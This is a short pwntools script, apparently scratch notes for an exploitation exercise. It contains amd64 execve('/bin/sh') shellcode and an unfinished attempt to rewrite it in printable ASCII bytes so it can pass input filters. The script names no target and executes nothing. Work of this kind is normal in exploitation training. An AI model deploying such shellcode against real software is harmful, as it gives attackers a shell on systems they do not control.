#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

context( arch = 'amd64' )



"""
    /* push '/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax

    /* call execve('rsp', 0, 0) */
    push (SYS_execve) /* 0x3b */
    pop rax
    mov rdi, rsp
    xor esi, esi /* 0 */
    cdq /* rdx=0 */
    syscall
"""

'''
0x20 ~ 0x7f
P   = push rax
j;  = push 0x3b
X   = pop rax
T   = push rsp
_   = pop rdi
4;  = xor al, 0x3b
^   = pop rsi
Z   = pop rdx
'''

'''
    /* push rsp */
    /* pop rdi */

    push 0x3b
    pop rax
    xor al, 0x3b
    push rax
    push rax
    pop rsi
    pop rdx

    pop rax
    pop rax
    pop rax
    pop rax
    pop rax
    pop rax
    pop rax
    pop rax
    pop rax
    pop rax
    pop rax
    pop rax

    push 0x3b3b3e34
    pop rax
    xor rax, 0x3b3b3b3b
    push rax

    pop rax
    pop rax
    pop rax
    pop rax
    push 0x3b
    pop rax
    push rsp
    pop rdi
    push 0x3b
    pop rax
    pop rax
    pop rax
    


'''